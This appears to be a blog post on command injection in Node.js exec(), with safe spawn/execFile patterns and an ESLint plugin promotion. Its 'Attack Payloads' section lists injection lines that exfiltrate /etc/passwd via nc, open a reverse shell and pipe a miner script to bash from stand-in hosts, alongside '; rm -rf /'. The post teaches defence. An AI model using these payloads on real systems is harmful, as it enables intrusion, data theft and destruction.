---
title: 'Command Injection: exec() with User Input'
published: false
description: 'Running user input in shell commands enables full server compromise. Here is the attack and safe alternatives.'
tags: nodejs, security, injection, eslint
cover_image:
series: Secure Coding
---

# Command Injection: exec() with User Input

```javascript
const { exec } = require('child_process');
exec(`convert ${userFilename} output.png`);
```

If `userFilename` is `; rm -rf /`, goodbye server.

## The Attack

```javascript
// Expected: image.jpg
exec('convert image.jpg output.png');

// Attack: image.jpg; rm -rf /
exec('convert image.jpg; rm -rf / output.png');
//                      ^^^^^^^^^^^ Shell executes this!
```

## Attack Payloads

```bash
# Data exfiltration
; cat /etc/passwd | nc attacker.com 9999

# Reverse shell
; bash -i >& /dev/tcp/attacker.com/9999 0>&1

# Cryptominer
; curl evil.com/miner.sh | bash
```

## Vulnerable Patterns

```javascript
// ❌ User input in exec
exec(`command ${userInput}`);

// ❌ User input in execSync
execSync(`echo ${message}`);

// ❌ User input in shell
spawn('/bin/sh', ['-c', `echo ${userInput}`]);
```

## Safe Patterns

```javascript
// ✅ Use spawn with arguments array
const { spawn } = require('child_process');
spawn('convert', [userFilename, 'output.png']);

// ✅ Use execFile (no shell)
const { execFile } = require('child_process');
execFile('convert', [userFilename, 'output.png']);

// ✅ Validate input
const ALLOWED_CHARS = /^[a-zA-Z0-9_.-]+$/;
if (!ALLOWED_CHARS.test(userFilename)) {
  throw new Error('Invalid filename');
}
```

## ESLint Rules

```javascript
import secureCoding from 'eslint-plugin-secure-coding';

export default [
  {
    rules: {
      'secure-coding/detect-child-process': 'error',
    },
  },
];
```

## Quick Install

{% cta https://npmjs.com/package/eslint-plugin-secure-coding %}
📦 npm install eslint-plugin-secure-coding
{% endcta %}

---

📦 [npm: eslint-plugin-secure-coding](https://www.npmjs.com/package/eslint-plugin-secure-coding)

---

🚀 **Check every exec/spawn with user input!**


{% cta https://github.com/ofri-peretz/eslint %}
⭐ Star on GitHub
{% endcta %}
[GitHub](https://github.com/ofri-peretz) | [LinkedIn](https://linkedin.com/in/ofri-peretz)
